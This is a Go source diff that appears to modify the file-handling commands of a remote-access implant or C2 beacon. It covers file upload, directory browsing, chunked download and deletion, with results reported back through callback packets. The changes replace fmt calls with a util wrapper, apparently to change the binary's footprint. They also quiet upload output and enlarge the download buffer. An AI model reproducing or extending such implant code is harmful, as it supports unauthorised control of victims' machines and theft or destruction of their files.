@@ -2,7 +2,6 @@ package command
 
 import (
 	"bytes"
-	"fmt"
 	"io"
 	"io/ioutil"
 	"main/packet"
@@ -35,7 +34,8 @@ func Upload(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("upload success"))
+	// this would make plenty of response
+	//packet.PushResult(packet.CALLBACK_OUTPUT, []byte("upload success"))
 	return nil
 }
 
@@ -77,7 +77,7 @@ func FileBrowse(b []byte) error {
 	// list files
 	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
 	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")
-	fmt.Println(dirPathStr)
+	util.Println(dirPathStr)
 	// build string for result
 	/*
 	   /Users/xxxx/Desktop/dev/deacon/*
@@ -109,13 +109,13 @@ func FileBrowse(b []byte) error {
 	modTimeStr := modTime.Format("02/01/2006 15:04:05")
 	resultStr := ""
 	if dirPathStr == "./" {
-		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
+		resultStr = util.Sprintf("%s/*", absCurrentDir)
 	} else {
-		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
+		resultStr = util.Sprintf("%s", string(dirPathBytes))
 	}
-	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
-	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
-	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
+	//resultStr := util.Sprintf("%s/*", absCurrentDir)
+	resultStr += util.Sprintf("\nD\t0\t%s\t.", modTimeStr)
+	resultStr += util.Sprintf("\nD\t0\t%s\t..", modTimeStr)
 	files, err := ioutil.ReadDir(dirPathStr)
 	if err != nil {
 		return err
@@ -124,9 +124,9 @@ func FileBrowse(b []byte) error {
 		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")
 
 		if file.IsDir() {
-			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
+			resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
 		} else {
-			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+			resultStr += util.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
 		}
 	}
 
@@ -158,8 +158,8 @@ func Download(b []byte) error {
 		return err
 	}
 	var fileContent []byte
-	// 512kb
-	fileBuf := make([]byte, 128*1024)
+	// 1M
+	fileBuf := make([]byte, 1024*1024)
 	for {
 		n, err := fileHandle.Read(fileBuf)
 		if err != nil && err != io.EOF {
@@ -184,7 +184,7 @@ func Remove(filePath string) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(fmt.Sprintf("remove %s success", filePath)))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(util.Sprintf("remove %s success", filePath)))
 	return nil
 }
 
